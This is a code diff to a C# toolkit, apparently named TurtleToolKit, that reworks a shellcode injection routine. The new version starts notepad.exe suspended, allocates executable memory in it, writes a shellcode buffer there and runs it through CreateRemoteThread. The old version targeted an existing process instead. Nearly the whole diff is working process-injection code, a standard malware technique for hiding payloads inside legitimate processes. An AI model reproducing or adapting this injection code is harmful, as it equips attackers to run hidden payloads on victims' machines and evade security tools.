@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Runtime.InteropServices;
 using System.Management.Automation;
 using TurtleToolKitManaged;
 
@@ -40,16 +41,26 @@ namespace TurtleToolKit
             // to do add error better error checking
             try
             {
+
+                Win32.STARTUPINFO si = new Win32.STARTUPINFO();
+                Win32.PROCESS_INFORMATION pi = new Win32.PROCESS_INFORMATION();
+                string path = "C:\\windows\\system32\\notepad.exe";
+                bool res = Win32.CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+                Win32.PROCESS_BASIC_INFORMATION bi = new Win32.PROCESS_BASIC_INFORMATION();
+                uint tmp = 0;
+                IntPtr hProcess = pi.hProcess; // process handle
+                Console.WriteLine(pi.dwProcessId);
                 int payloadSize = shellcode.Length;
                 IntPtr outSize;
-                IntPtr hProcess = Win32.OpenProcess(0x001F0FFF, false, processId);
-                IntPtr addr = Win32.VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+                //IntPtr hProcessTwo = Win32.OpenProcess(0x001F0FFF, false, pi.dwProcessId);
+                IntPtr addr = Win32.VirtualAllocEx(hProcess, IntPtr.Zero,(uint)shellcode.Length, 0x3000, 0x40);
                 if (!Win32.WriteProcessMemory(hProcess, addr, shellcode, payloadSize, out outSize))
                 {
-                    Console.WriteLine("failed to write process memory");
+                    Console.WriteLine("failed to write process memory {0}",Marshal.GetLastWin32Error());
                     return false;
                 }
                 IntPtr hThread = Win32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+                Win32.ResumeThread(pi.Thread);
                 return true;
             }
             catch (Exception e)
